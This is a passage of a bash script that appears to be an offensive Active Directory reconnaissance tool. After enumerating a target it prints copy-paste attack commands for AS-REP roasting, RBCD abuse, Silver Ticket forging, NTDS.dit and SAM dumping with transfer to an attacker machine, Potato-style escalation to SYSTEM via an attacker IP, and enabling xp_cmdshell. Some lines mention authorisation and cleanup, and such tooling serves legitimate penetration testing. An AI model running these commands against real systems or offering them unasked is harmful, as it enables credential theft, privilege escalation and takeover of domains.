        ATTACK_PATHS+=("AS-REP Roasting (User hashes obtainable)")
        critical "Attack Path: AS-REP Roasting Possible (User hashes obtainable)"
        lightbulb "Next Steps:"
        echo "   - Request AS-REP hashes (GetNPUsers.py / netexec / crackmapexec ldap $TARGET_IPV4 -u username -p 'password' --asreproast output.txt)"
        echo "   - Crack hashes offline (hashcat mode 18200)"
        echo "   - Re-test LDAP/SMB/WinRM with cracked creds"
        echo
    fi
    
    # 5. RBCD candidate (needs MAQ + writable ACLs later)
    #if [[ "$MAQ_ENABLED" == true && "$HAS_WRITABLE_COMPUTER_ACL" == true ]]; then
    if [[ "$MAQ_ENABLED" == true ]]; then
        ATTACK_PATHS+=("RBCD via MAQ")
        critical "Attack Path: Resource-Based Constrained Delegation candidate"
        lightbulb "Next Steps:"
        echo "   - Create a new computer account (MAQ abuse)"
        echo "       * netexec ldap $TARGET_IPV4 -u <user> -p <pass> --add-computer <name>$ <pass>"
        echo "   - Identify writable target computer object"
        echo "   - Set msDS-AllowedToActOnBehalfOfOtherIdentity"
        echo "       * rbcd.py <domain>/<user>:<pass> -t <target_computer> -f <new_computer>$"
        echo "   - Request service ticket as privileged user (S4U2Proxy)"
        echo "       * getST.py -spn cifs/<target> <domain>/<new_computer>$:<pass>"
        echo "   - Authenticate as impersonated user (SMB / WinRM / LDAP)"
        echo
    fi
    # The NetExec BadSuccessor module may independently identify Server 2025.
    if [[ "${BADSUCCESSOR_DC_2025:-false}" == true ]]; then
        dc_2025=true
    fi
     # ---------------------------------------------------------------------------
     # BadSuccessor / dMSA
     #
     # Add an attack path only when:
     #   1. A Windows Server 2025 DC was identified.
     #   2. NetExec found a relevant OU permission.
     #   3. The trustee applies to the current user or one of their groups.
     # ---------------------------------------------------------------------------
     if [[ "${BADSUCCESSOR_CHECK_DONE:-false}" == true || "${BADSUCCESSOR_CANDIDATES_FOUND:-false}" == true || "${BADSUCCESSOR_APPLICABLE:-false}" == true ]]; then
        echo
        info "Evaluating BadSuccessor/dMSA findings"

        if [[ "$dc_2025" == true && "${BADSUCCESSOR_CANDIDATES_FOUND:-false}" == true && "${BADSUCCESSOR_APPLICABLE:-false}" == true ]]; then
            ATTACK_PATHS+=(
                "BadSuccessor/dMSA OU Permission Abuse Candidate"
            )

            critical "Attack Path: BadSuccessor/dMSA OU permission abuse candidate"

            echo " - A Windows Server 2025 domain controller was identified"
            echo " - A writable OU or delegated permission was reported"
            echo " - The trustee matches the authenticated user or group context"

            if declare -p BADSUCCESSOR_APPLICABLE_TRUSTEES >/dev/null 2>&1; then
                echo -e " ${YELLOW}Applicable trustee/OU findings:${RESET}"

                for trustee in "${BADSUCCESSOR_APPLICABLE_TRUSTEES[@]}"; do
                    if [[ -n "$trustee" ]]; then
                        echo -e "  ${GREEN}- $trustee${RESET}"
                    fi
                done
            fi

            lightbulb "Validation steps:"

            echo " - Confirm the trustee through BloodHound or direct LDAP ACL review"
            echo " - Validate inherited ACEs, deny ACEs, and effective permissions"
            echo " - Confirm the Server 2025 update and patch state"
            echo " - Confirm the domain's dMSA and KDS prerequisites"
            echo " - Preserve the NetExec output as supporting evidence"

            if [[ -n "${BADSUCCESSOR_EVIDENCE:-}" ]]; then
                note "Evidence: ${BADSUCCESSOR_EVIDENCE}"
            fi

        elif [[ "${BADSUCCESSOR_CANDIDATES_FOUND:-false}" == true && "${BADSUCCESSOR_APPLICABLE:-false}" != true ]]; then
            notify "BadSuccessor OU-permission candidates were reported, but none matched the current user/group context"
            note "Do not add the finding to the current user's attack paths until trustee membership is confirmed"

            if [[ -n "${BADSUCCESSOR_EVIDENCE:-}" ]]; then
                note "Evidence: ${BADSUCCESSOR_EVIDENCE}"
            fi

        elif [[ "${BADSUCCESSOR_APPLICABLE:-false}" == true && "$dc_2025" != true ]]; then
            notify "A BadSuccessor trustee matched, but Server 2025 DC evidence is missing"
            note "Treat the finding as incomplete until the DC operating-system version is verified"
        elif [[ "$dc_2025" == true ]]; then
            success "Server 2025 DC identified, but no applicable BadSuccessor OU-permission finding was reported"
        else
            notify "BadSuccessor assessment completed without a supported attack-path finding"
        fi
    fi
    
    # 6. Kerberoast
    if [[ "${KERBEROAST_HASH_FOUND:-false}" == true ]] &&
       [[ "${NTLM_DISABLED:-false}" == true ]] &&
       [[ -n "${SPN_NAME:-}" ]]; then
        echo ""
        critical "Attack Path: Silver Ticket Attack is Viable"
        lightbulb "Next Steps:"
        echo -e "   - Obtain Domain SID for ${AUTH_DOMAIN:-$LDAP_DOMAIN}: ${YELLOW}$DOMAIN_SID${RESET}" 
        echo -e "   - Crack the Kerberoast hash for the SPN account: ${YELLOW}$SPN_NAME${RESET}" 
        echo -e "   - Acquire the NTLM hash for the pwned SPN Account."
        echo -e "         ${GREEN}impacket-secretsdump ${AUTH_DOMAIN:-$LDAP_DOMAIN}/$KERBEROAST_USER:[CrackedPassword]@$TARGET_IPV4"
        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
        echo -e "        ${GREEN}impacket-GetUserSPNs '${AUTH_DOMAIN:-$LDAP_DOMAIN}/$AUTH_USER:$AUTH_PASS' -k -dc-ip $TARGET_IPV4 -dc-host $DOMAIN_CONTROLLER -request${RESET}"
        echo -e "                   OR "
        echo -e "        ${GREEN}ntlmhashgen.py -u [target_user] -p [CrackedPassword] ${RESET}"
        echo -e "   - Use the hash to forge a Silver Ticket:"
        echo -e "         ${GREEN}impacket-ticketer -nthash <NTLM> -domain ${AUTH_DOMAIN:-$LDAP_DOMAIN} -user ${AUTH_USER} -password '${AUTH_PASS}' -spn ${SPN_NAME} -domain-sid '${DOMAIN_SID}' -dc-ip $DOMAIN_CONTROLLER administrator${RESET}"
        echo -e "         ${GREEN}export KRB5CCNAME=silver_ticket.ccache${RESET}"
        echo -e "         ${GREEN}impacket-smbclient -k -no-pass $KERBEROAST_USER/$TARGET_IPV4${RESET}"
        echo -e "   - Test access to MSSQL, SMB, or other SPN-related services"
    fi
    
    # 7. Privilege Escalation via Misconfigured Privileges
    if [[ "$ESCALATION_PRIVS_FOUND" == true ]] && [[ ${#FOUND_ESCALATION_PRIVS[@]} -gt 0 ]]; then
        ATTACK_PATHS+=("Privilege Escalation via Misconfigured Rights")
        critical "Attack Path: Local Privilege Escalation Possible"
        lightbulb "Next Steps:"
        echo -e "   - Use privesc tools (e.g. PrintSpoofer, JuicyPotato, RoguePotato) depending on rights"
        echo -e "   - Consider using PowerUp.ps1 / winPEAS / seatbelt.exe for further enumeration"
        echo -e "   - Exploitable privileges found:"
        for priv in "${FOUND_ESCALATION_PRIVS[@]}"; do
            echo -e "       ${GREEN}- $priv${RESET}"
        done
        echo
    fi
    # 7a. SeBackupPrivilege Exploitation
    if [[ "$SE_BACKUP_PRIV" == true ]]; then
        ATTACK_PATHS+=("SeBackupPrivilege Abuse (NTDS.dit/SAM Dump)")
        critical "Attack Path: SeBackupPrivilege — Possible NTDS.dit or SAM Dump"
        lightbulb "Next Steps:"
        echo "   - Use tools like BackupMaster or SharpBackup to read sensitive files"
        echo '   - Dump NTDS.dit or SYSTEM/SAM from C:\\Windows\\NTDS or Registry'
        echo "   - Example SharpBackup usage:"
        echo '         SharpBackup.exe backup /file:C:\\windows\\ntds\\ntds.dit'
        echo '   - Alternatively, use diskshadow to create shadow copies:"'
        echo "         Copy: /home/kali/Documents/smbserverfiles/seBackupPriv_Abuse/grapejuice.dsh"
        echo "         diskshadow /s grapejuice.dsh"
        echo "         robocopy /b h:\\windows\\ntds . ntds.dit"
	echo '         reg save hklm\system c:\\Temp\\system'
        echo '         + Transfer to Attacker Machine for local cracking'
        echo '   - Alternatively, copy registry:"'
        echo '         cd c:\'
	echo '         mkdir Temp'
	echo '         reg save hklm\sam c:\\Temp\\sam'
	echo '         reg save hklm\system c:\\Temp\\system'
	echo '         + Transfer to Attacker Machine for local cracking'
        echo "   - Then use impacket-secretsdump locally:"
        echo "         impacket-secretsdump LOCAL -system SYSTEM -ntds ntds.dit -outputfile creds.txt "
        echo "         impacket-secretsdump LCOAL -system SYSTEM -sam SAM -outputfile creds.txt "
        echo
    fi
    # 7b. SeImpersonatePrivilege Exploitation
    if [[ "$SE_IMPERSONATE_PRIV" == true ]]; then
        ATTACK_PATHS+=("SeImpersonatePrivilege Abuse (Potato Exploits)")
        critical "Attack Path: SeImpersonatePrivilege — Potato-style Exploits Possible"
        lightbulb "Next Steps:"
        echo "   - Use tools like PrintSpoofer, RoguePotato, or JuicyPotatoNG to escalate to SYSTEM"
        echo "   - PrintSpoofer (if named pipe is available):"
        echo "         PrintSpoofer.exe -i -c 'cmd.exe'"
        echo "         PrintSpoofer64.exe -i -c 'cmd.exe'"
        echo "   - RoguePotato (more flexible, no print spooler needed):"
        echo "         RoguePotato.exe -r <attacker_ip> -l 9999 -e cmd.exe"
        echo "   - JuicyPotatoNG (older method, needs CLSID):"
        echo "         JuicyPotatoNG.exe -t * -p cmd.exe -l 1337"
        echo "   - If successful, this grants SYSTEM-level command shell"
        echo "   - Be sure to check which named pipes are available:"
        echo '         \\.\\pipe\\spoolss, epmapper, lsarpc, etc.'
        echo
    fi
    # 8. BloodHound
    if [[ -n "$BH_ZIP_FILE" ]]; then
        ATTACK_PATHS+=("BloodHound Review of the Domain")
        critical "Attack Path: BloodHound Review of the Domain"
        lightbulb "Next Steps:"
        echo "   - BloodHound Data was gathered for: ${AUTH_DOMAIN:-$LDAP_DOMAIN}"
        echo "   - Start BloodHound 'sudo bloodhound'"
        echo "   - Login"
        echo "   - Import File: ${BH_ZIP_FILE}"
        echo "   - Review for Paths to Crown Jewels. Review for Permission Abuse."
    fi
    
    # 9. NFS Services
    if [[ "${NFS_FOUND:-false}" == true ]]; then
        echo -e "\n ${CYAN}NFS SERVICES${RESET}"
        echo -e " --------------------------------------"

        print_item "$NFS_FOUND" "NFS Service Detected"

        if [[ "${NFS_WORLD_EXPORT:-false}" == true ]]; then
            print_item "$NFS_WORLD_EXPORT" "World-accessible NFS export detected"
            print_item "$NFS_WORLD_EXPORT" "- Enumerate exports [showmount -e $TARGET_IPV4]"
            print_item "$NFS_WORLD_EXPORT" "- Mount exports read-only and inspect numeric UID/GID ownership"
            print_item "$NFS_WORLD_EXPORT" "   - sudo mkdir -p /mnt/nfs"
            print_item "$NFS_WORLD_EXPORT" "   - sudo mount -t nfs -o ro $TARGET_IPV4:/EXPORT /mnt/nfs"
            print_item "$NFS_WORLD_EXPORT" "- Check backups, home directories, SSH keys, configs, and web roots"

            if [[ -n "${NFS_EXPORTS_FILE:-}" ]]; then
                echo -e " Export results: ${YELLOW}${NFS_EXPORTS_FILE}${RESET}"
            fi
        else
            print_item "$NFS_FOUND" \
                "- Review RPC/NFS results and test exports with read-only mounts"
        fi
    fi
    
    # 10. MSSQL Services and Authenticated Access
    #
    # Treat either successful authentication result as proof that the MSSQL
    # instance responded, even if MSSQL_INSTANCE_FOUND was not set because
    # the discovery output format changed.
    if [[ "${MSSQL_INSTANCE_FOUND:-false}" == true \
        || "${MSSQL_AUTH_OK:-false}" == true \
        || "${MSSQL_LCLAUTH_OK:-false}" == true ]]; then

        echo -e "\n ${CYAN}MSSQL SERVICES${RESET}"
        echo -e " --------------------------------------"
        print_item true "MSSQL instance detected on ${TARGET_IPV4}:1433"

        mssql_authenticated=false

        if [[ "${MSSQL_AUTH_OK:-false}" == true ]]; then
            mssql_authenticated=true
            print_item true "MSSQL default/domain authentication succeeded"
        fi

        if [[ "${MSSQL_LCLAUTH_OK:-false}" == true ]]; then
            mssql_authenticated=true
            print_item true "MSSQL local authentication succeeded (--local-auth)"
        fi
        
        if [[ "${mssql_authenticated:-false}" == true ]];then
            #
            # MSSQL privilege and impersonation findings
            #
            if [[ "${MSSQL_PRIV_CHECKED:-false}" == true ]]; then
                print_item true \
                    "MSSQL privilege and impersonation checks completed"
            fi

            if [[ "${MSSQL_IMPERSONATION_FOUND:-false}" == true ]]; then
                ATTACK_PATHS+=("MSSQL Login Impersonation")

                critical \
                    "Attack Path: Authenticated MSSQL login can impersonate another SQL principal"

                print_item true \
                    "MSSQL login impersonation permission discovered"

                if [[ -n "${MSSQL_IMPERSONATION_TARGETS:-}" ]]; then
                    echo "   - Impersonation targets:"

                    while IFS= read -r mssql_target; do
                        [[ -n "$mssql_target" ]] || continue

                        printf '       - %b%s%b\n' \
                            "$BYELLOW" "$mssql_target" "$RESET"
                    done <<< "$MSSQL_IMPERSONATION_TARGETS"
                fi

                echo
                echo "   - Validate each impersonated login manually:"

                while IFS= read -r mssql_target; do
                    [[ -n "$mssql_target" ]] || continue

                    printf "         EXECUTE AS LOGIN = '%s';\n" \
                        "${mssql_target//\'/\'\'}"

                    echo \
                        "         SELECT SYSTEM_USER, ORIGINAL_LOGIN(), IS_SRVROLEMEMBER('sysadmin');"

                    echo \
                        "         SELECT * FROM fn_my_permissions(NULL, 'SERVER');"

                    echo "         REVERT;"
                done <<< "$MSSQL_IMPERSONATION_TARGETS"

                echo
                echo "   - Impersonation does not automatically mean sysadmin."
                echo "     Check database access, server permissions, linked servers,"
                echo "     SQL Agent roles, and additional impersonation chains."
            fi

            if [[ "${MSSQL_PRIVESC_PATH_FOUND:-false}" == true ]]; then
                ATTACK_PATHS+=("MSSQL Privilege Escalation Path")

                critical \
                    "Attack Path: MSSQL privilege-escalation path to sysadmin identified"

                print_item true \
                    "NetExec identified a potential MSSQL path to sysadmin"

                if [[ -n "${MSSQL_PRIVESC_MODE:-}" ]]; then
                    print_item true \
                        "Privilege path detected using ${MSSQL_PRIVESC_MODE} authentication"
                fi
            fi

            if [[ "${MSSQL_DBOWNER_PRIVESC_FOUND:-false}" == true ]]; then
                ATTACK_PATHS+=("MSSQL db_owner TRUSTWORTHY Escalation")

                critical \
                    "Attack Path: MSSQL db_owner/TRUSTWORTHY escalation condition identified"

                print_item true \
                    "Potential db_owner plus TRUSTWORTHY escalation detected"

                echo "   - Validate the database ownership and TRUSTWORTHY state:"
                echo "         SELECT"
                echo "             name,"
                echo "             is_trustworthy_on,"
                echo "             SUSER_SNAME(owner_sid) AS owner_name,"
                echo "             IS_SRVROLEMEMBER("
                echo "                 'sysadmin',"
                echo "                 SUSER_SNAME(owner_sid)"
                echo "             ) AS owner_is_sysadmin"
                echo "         FROM sys.databases;"
                echo
                echo "   - A useful escalation condition is:"
                echo "       * impersonated login has db_owner"
                echo "       * database has TRUSTWORTHY enabled"
                echo "       * database owner is a sysadmin"
                echo
                echo "   - Confirm database-level permissions:"
                echo "         USE [database_name];"
                echo "         SELECT USER_NAME(), IS_MEMBER('db_owner');"
                echo "         SELECT * FROM fn_my_permissions(NULL, 'DATABASE');"
            fi

            if [[ "${MSSQL_PRIVESC_ATTEMPTED:-false}" == true \
                && "${MSSQL_PRIVESC_OK:-false}" != true \
                && "${MSSQL_PRIVESC_PATH_FOUND:-false}" != true ]]; then

                if [[ "${MSSQL_IMPERSONATION_FOUND:-false}" == true ]]; then
                    warn \
                        "MSSQL impersonation exists, but no direct sysadmin path was confirmed"
                else
                    notify \
                        "MSSQL privilege check completed without identifying a sysadmin path"
                fi
            fi

            if [[ "${MSSQL_PRIVESC_OK:-false}" == true ]]; then
                ATTACK_PATHS+=("MSSQL Sysadmin Access")

                critical \
                    "Attack Path: MSSQL privilege escalation succeeded"

                print_item true \
                    "Authenticated MSSQL login was elevated to sysadmin"

                echo "   - Confirm the effective privilege:"
                echo "         SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');"

                echo "   - Review and execute the recorded rollback command after testing."
            elif [[ "${MSSQL_SYSADMIN:-false}" == true ]]; then
                ATTACK_PATHS+=("MSSQL Sysadmin Access")

                critical \
                    "Attack Path: Authenticated MSSQL sysadmin access confirmed"

                print_item true \
                    "Authenticated MSSQL login has sysadmin privileges"
            fi

            #
            # MSSQL RID brute findings
            #
            if [[ "${MSSQL_RIDBRUTE_OK:-false}" == true \
                || "${MSSQL_RIDBRUTE_LCLAUTH_OK:-false}" == true ]]; then

                ATTACK_PATHS+=("MSSQL RID Enumeration")

                print_item true \
                    "Domain principals were enumerated through MSSQL RID brute"

                if [[ "${MSSQL_RIDBRUTE_OK:-false}" == true ]]; then
                    print_item true \
                        "RID brute succeeded using default/domain authentication"
                fi

                if [[ "${MSSQL_RIDBRUTE_LCLAUTH_OK:-false}" == true ]]; then
                    print_item true \
                        "RID brute succeeded using local MSSQL authentication"
                fi

                echo "   - RID output may include users, groups, service accounts,"
                echo "     and computer accounts."
                echo "   - Validate account types through LDAP before using the"
                echo "     generated candidate list for authentication testing."
            fi 
            #
            # xp_cmdshell configuration and execution findings
            #
            if [[ "${MSSQL_CMDSHELL_CHECKED:-false}" == true ]]; then
                print_item true \
                    "MSSQL xp_cmdshell configuration permissions were checked"
            fi

            if [[ "${MSSQL_CMDSHELL_ENABLE_ATTEMPTED:-false}" == true ]]; then
                print_item true \
                    "An xp_cmdshell enablement check was attempted"
            fi

            #
            # Highest-confidence result: a command was actually executed.
            #
            if [[ "${MSSQL_CMDSHELL_EXEC_OK:-false}" == true ]]; then
                ATTACK_PATHS+=(
                    "Confirmed OS Command Execution via MSSQL xp_cmdshell"
                )

                critical \
                    "Attack Path: OS command execution through MSSQL xp_cmdshell confirmed"

                print_item true \
                    "The authenticated SQL context successfully executed an operating-system command"

                echo "   - Determine the Windows execution context:"
                echo "         EXEC master..xp_cmdshell 'whoami';"
                echo
                echo "   - Determine whether execution uses the SQL Server service"
                echo "     account or an xp_cmdshell proxy account."
                echo
                echo "   - Treat this as confirmed remote code execution under the"
                echo "     returned Windows account."
                echo
                echo "   - Record created files, processes, network connections, and"
                echo "     configuration changes for cleanup."

            #
            # xp_cmdshell is available, but execution has not been proven.
            #
            elif [[ "${MSSQL_CMDSHELL_CONFIG_ENABLED:-false}" == true \
                || "${MSSQL_CMDSHELL_ALREADY_ENABLED:-false}" == true \
                || "${MSSQL_CMDSHELL_ENABLE_OK:-false}" == true ]]; then

                ATTACK_PATHS+=(
                    "Potential OS Command Execution via MSSQL xp_cmdshell"
                )

                critical \
                    "Potential Attack Path: MSSQL xp_cmdshell is enabled or was enabled successfully"

                if [[ "${MSSQL_CMDSHELL_ALREADY_ENABLED:-false}" == true \
                    || "${MSSQL_CMDSHELL_CONFIG_ENABLED:-false}" == true ]]; then

                    print_item true \
                        "xp_cmdshell is configured as enabled"
                fi

                if [[ "${MSSQL_CMDSHELL_ENABLE_OK:-false}" == true ]]; then
                    print_item true \
                        "The authenticated SQL login successfully enabled xp_cmdshell"

                    warn \
                        "The xp_cmdshell server configuration was modified during testing"

                    echo "   - Restore its original configuration after validation."
                fi

                echo "   - Enabled does not necessarily mean the current SQL login"
                echo "     is allowed to execute xp_cmdshell."
                echo
                echo "   - Use a low-impact execution check:"
                echo "         EXEC master..xp_cmdshell 'whoami';"
                echo
                echo "   - A non-sysadmin login requires EXECUTE permission and a"
                echo "     valid ##xp_cmdshell_proxy_account## credential."
            fi

            #
            # The current login could not change the configuration.
            #
            if [[ "${MSSQL_CMDSHELL_PERMISSION_DENIED:-false}" == true ]]; then
                warn \
                    "MSSQL login cannot enable xp_cmdshell because it cannot run RECONFIGURE"

                print_item true \
                    "Valid MSSQL authentication confirmed, but server configuration privileges are restricted"

                echo "   - This indicates that the current login does not have the"
                echo "     required ALTER SETTINGS, CONTROL SERVER, or sysadmin-level"
                echo "     configuration access."
                echo
                echo "   - This does not prove that xp_cmdshell is disabled."
                echo
                echo "   - This does not prove that xp_cmdshell execution is denied."
                echo "     An already-enabled configuration and proxy account may still"
                echo "     allow a non-sysadmin login to execute it."
                echo
                echo "   - Check the configuration without attempting to modify it:"
                echo "         SELECT"
                echo "             name,"
                echo "             value,"
                echo "             value_in_use"
                echo "         FROM sys.configurations"
                echo "         WHERE name = 'xp_cmdshell';"
                echo
                echo "   - Then test the current execution permission separately:"
                echo "         EXEC master..xp_cmdshell 'whoami';"

                if [[ -n "${MSSQL_CMDSHELL_ERROR:-}" ]]; then
                    printf '   - NetExec error: %s\n' \
                        "$MSSQL_CMDSHELL_ERROR"
                fi

                if [[ "${MSSQL_IMPERSONATION_FOUND:-false}" == true ]]; then
                    echo
                    echo "   - SQL login impersonation is available. Check whether an"
                    echo "     impersonation target has stronger configuration or"
                    echo "     xp_cmdshell execution permissions."

                    while IFS= read -r mssql_target; do
                        [[ -n "$mssql_target" ]] || continue

                        escaped_target="${mssql_target//\'/\'\'}"

                        printf "         EXECUTE AS LOGIN = N'%s';\n" \
                            "$escaped_target"

                        echo \
                            "         SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');"

                        echo \
                            "         SELECT * FROM fn_my_permissions(NULL, 'SERVER');"

                        echo \
                            "         EXEC master..xp_cmdshell 'whoami';"

                        echo "         REVERT;"
                    done <<< "${MSSQL_IMPERSONATION_TARGETS:-}"
                fi
            fi

            #
            # Generic failure not already classified as a permission denial.
            #
            if [[ "${MSSQL_CMDSHELL_ENABLE_FAILED:-false}" == true \
                && "${MSSQL_CMDSHELL_PERMISSION_DENIED:-false}" != true ]]; then

                warn \
                    "xp_cmdshell enablement failed for an unclassified reason"

                if [[ -n "${MSSQL_CMDSHELL_ERROR:-}" ]]; then
                    printf '   - NetExec error: %s\n' \
                        "$MSSQL_CMDSHELL_ERROR"
                fi
            fi
	fi

        if [[ "$mssql_authenticated" == true ]]; then
            ATTACK_PATHS+=("Authenticated MSSQL Access")
            critical "Attack Path: Authenticated MSSQL access confirmed"
            lightbulb "Next Steps (MSSQL):"

            printf -v mssql_auth_command \
                'netexec mssql %q -u %q -p %q' \
                "$TARGET_IPV4" "$AUTH_USER" "$AUTH_PASS"

            printf -v mssql_local_command \
                '%s --local-auth' \
                "$mssql_auth_command"

            if [[ "${MSSQL_AUTH_OK:-false}" == true ]]; then
                echo "   - Reconnect using default/domain authentication:"
                echo -e "         ${GREEN}${mssql_auth_command}${RESET}"
            fi

            if [[ "${MSSQL_LCLAUTH_OK:-false}" == true ]]; then
                echo "   - Reconnect using local authentication:"
                echo -e "         ${GREEN}${mssql_local_command}${RESET}"
            fi
            
            echo "   - Identify the effective and original SQL security contexts:"
            echo "         SELECT"
            echo "             SYSTEM_USER AS effective_login,"
            echo "             ORIGINAL_LOGIN() AS original_login,"
            echo "             USER_NAME() AS database_user,"
            echo "             DB_NAME() AS current_database,"
            echo "             IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin;"
            echo "         SELECT * FROM fn_my_permissions(NULL, 'SERVER');"
            echo "   - Enumerate accessible databases and permissions:"
            echo "         SELECT name FROM sys.databases;"
            echo "   - Review linked servers, impersonation rights, SQL Agent roles,"
            echo "     TRUSTWORTHY databases, and command-execution features."
            echo "   - Only test command execution when explicitly authorized and"
            echo "     the authenticated principal has the required privileges."
            echo "   - Enumerate server-level impersonation permissions:"
            echo "         SELECT"
            echo "             grantee.name AS grantee,"
            echo "             target.name AS impersonatable_login,"
            echo "             permission_name,"
            echo "             state_desc"
            echo "         FROM sys.server_permissions AS permission"
            echo "         JOIN sys.server_principals AS grantee"
            echo "           ON permission.grantee_principal_id = grantee.principal_id"
            echo "         JOIN sys.server_principals AS target"
            echo "           ON permission.major_id = target.principal_id"
            echo "         WHERE permission.permission_name = 'IMPERSONATE';"

            echo "   - Enumerate database ownership and TRUSTWORTHY settings:"
            echo "         SELECT"
            echo "             name,"
            echo "             SUSER_SNAME(owner_sid) AS owner_name,"
            echo "             is_trustworthy_on"
            echo "         FROM sys.databases;"

            echo "   - Enumerate linked SQL servers:"
            echo "         SELECT"
            echo "             name,"
            echo "             product,"
            echo "             provider,"
            echo "             data_source,"
            echo "             is_linked,"
            echo "             is_data_access_enabled,"
            echo "             is_rpc_out_enabled"
            echo "         FROM sys.servers;"
            echo
            echo "   - xp_cmdshell notes:"
            echo "       * xp_cmdshell is commonly disabled by default and enabling it"
            echo "         changes the SQL Server configuration and creates audit artifacts."
            echo "       * Check its current state without changing configuration:"
            echo "         SELECT name, value, value_in_use"
            echo "         FROM sys.configurations WHERE name = 'xp_cmdshell';"
            echo "       * Confirm the current login and server-role membership first:"
            echo "         SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');"
            echo "       * If xp_cmdshell is already enabled, use a low-impact validation:"
            echo "         EXEC master..xp_cmdshell 'whoami';"
            echo "       * Enabling xp_cmdshell generally requires CONTROL SERVER:"
            echo "         EXEC sp_configure 'show advanced options', 1; RECONFIGURE;"
            echo "         EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
            echo "       * Record the original settings before changing them and restore"
            echo "         those original values when testing is complete."
            echo "       * A sysadmin invocation runs under the SQL Server service account."
            echo "         A non-sysadmin invocation requires an xp_cmdshell proxy account"
            echo "         and explicit EXECUTE permission on xp_cmdshell."
            echo
            echo "   - Metasploit notes:"
            echo "       * Prefer enumeration modules before payload execution:"
            echo "         use auxiliary/scanner/mssql/mssql_login"
            echo "         use auxiliary/admin/mssql/mssql_enum"
            echo "       * In msfconsole, review the module before running it:"
            echo "         search mssql"
            echo "         info"
            echo "         show options"
            echo "       * Set RHOSTS, RPORT, USERNAME, and PASSWORD, then use check when"
            echo "         the selected module supports it."
            echo "       * exploit/windows/mssql/mssql_payload uses xp_cmdshell to execute"
            echo "         a payload and may leave an executable on the target."
            echo "         Use it only when payload execution is explicitly in scope and"
            echo "         cleanup, logging, and endpoint-impact controls are planned."
            echo "       * Module names and behavior can vary by installed Metasploit"
            echo "         version, so verify them with search, info, and show options."
            echo
        else
            warn "MSSQL instance found, but supplied credentials were not accepted"
        fi
    fi
    
    # No viable paths
    if [[ ${#ATTACK_PATHS[@]} -eq 0 ]]; then
        warn "No immediate attack paths identified"
    fi
    
}

# Generate Attack Path Summary
attack_path_evaluation

# --------- Recon Summary & Next Steps ----------
echo
echo -e "${BLUE}============================${RESET}"
echo -e "${BLUE}Recon Summary & Next Steps${RESET}"
echo -e "${BLUE}============================${RESET}"

if [[ $HAS_SMB -eq 1 && $HAS_LDAP -eq 1 && $HAS_KERB -eq 1 ]]; then
    critical "ATTACK SURFACE: ACTIVE DIRECTORY"
    lightbulb "Suggested path:"
    echo "    → User / Password Spray"
    echo "    → SMB share creds"
    echo "    → Bloodhound"
    echo "    → Kerberos user enum"
    echo "    → Kerberoast"
    echo "    → AS-REP roast"
    echo "    → Silver Ticket"
    echo "    → Golden Ticket"
    echo "    → SMB share creds"
    echo "    → WinRM / RDP"
    echo
elif [[ $HAS_SMB -eq 1 ]]; then
    alert "ATTACK SURFACE: FILE SHARES / WINDOWS HOST"
elif [[ "$NFS_FOUND" == true ]]; then
    alert "ATTACK SURFACE: NFS / UNIX FILE SHARES"
elif [[ $HAS_WEB -eq 1 ]]; then
    alert "ATTACK SURFACE: WEB APPLICATION"
fi
if [[ $HAS_WEB -eq 1 && $HAS_SMB -eq 1 ]]; then
    finding "  Web + SMB attack surface overlap detected"
    echo
fi
if [[ "$HAS_MSSQL" == "true" ]]; then
    finding "  MSSQL attack surface detected"
    echo
fi

sort -u "$HINT_FILE" | while read HINT; do
    case "$HINT" in
        DOCKER)
cat <<EOF
[Docker API]
  - Review container mounts and bind volumes
  - Check for privileged containers
  - Inspect images for credentials or SSH keys
EOF
        ;;
        K8S)
cat <<EOF
[Kubernetes API]
  - Test anonymous access to /version and /api
  - Enumerate namespaces and pods
  - Look for exposed service account tokens
EOF
        ;;
        SMB)
cat <<EOF
[SMB]
  - Enumerate shares and permissions
  - Check for anonymous or guest access
  - Search for configuration files or backups
  - Tools: smbclient, crackmapexec, enum4linux-ng, nxc, smbmap, responder
EOF
        ;;
        NFS)
cat <<EOF
[Network File Server | NFS]
  - Likely Linux Server
  - Prioritize backups, home directories, SSH material, configs, and web roots
  - Mount read-only first and inspect numeric UID/GID ownership
     - sudo mkdir -p /mnt/nfs
     - sudo mount -t nfs -o ro <TARGET_IP>:/EXPORT /mnt/nfs
       - ls -lan /mnt/nfs
       - find /mnt/nfs -maxdepth 4 -ls 2>/dev/null
       - grep -RniE 'password|secret|token|key|credential' /mnt/nfs 2>/dev/null
     - sudo umount /mnt/nfs
  - Tools: impacket-GetNPUsers, kerbrute, kinit, impacket
EOF
	;;
	KERBEROS)
cat <<EOF
[Kerberos / Active Directory]
  - Likely Windows domain controller
  - Identify realm and domain name
  - Enumerate users via Kerberos pre-auth
  - Attempt AS-REP roasting if pre-auth disabled (impacket-GetNPUsers, kerbrute, Rubeus)
  - Combine with LDAP/SMB/WinRM
  - Tools: impacket-GetNPUsers, kerbrute, kinit, impacket
EOF
	;;
        LDAP)
cat <<EOF
[LDAP]
  - Anonymous bind allowed → full directory disclosure
  - Harvest users for:
      • Kerberos roasting
      • SMB / WinRM auth attempts
  - Check for:
      • LAPS password exposure
      • Kerberoastable SPNs
      • Delegation misconfigurations
  - Tools:
      ldapsearch, ldapdomaindump, bloodhound-python
EOF
	;;
        RDP)
cat <<EOF
[RDP]
  - Identify valid usernames
  - Check for weak or reused credentials
  - Inspect NLA configuration
EOF
        ;;
        DB)
cat <<EOF
[Databases]
  - Identify database versions
  - Check authentication requirements
  - Test for default or weak credentials
  - Tools: nxc, sqlmap
EOF
        ;;
        DNS)
cat <<EOF
[DNS]
  - Attempt zone transfers (AXFR)
  - Enumerate subdomains
EOF
        ;;
        WINRM)
cat <<EOF
[WinRM]
  - Check for valid domain or local users
  - Look for credential reuse
  - Combine with SMB, MSSQL, or LDAP findings
  - Tools: evil-winrm
EOF
        ;;
        WEB)
cat <<EOF
[Web Services]
  - Fingerprint applications and frameworks
  - Enumerate directories and APIs
  - Look for admin panels or debug endpoints
  - Look for subdomains
  - Tools: dirbuster, ffuf
EOF
        ;;
        REDIS)
cat <<EOF
[Redis]
  - Test CONFIG GET *
  - Look for writable directories
  - Attempt SSH key injection
EOF
        ;;

    esac
done

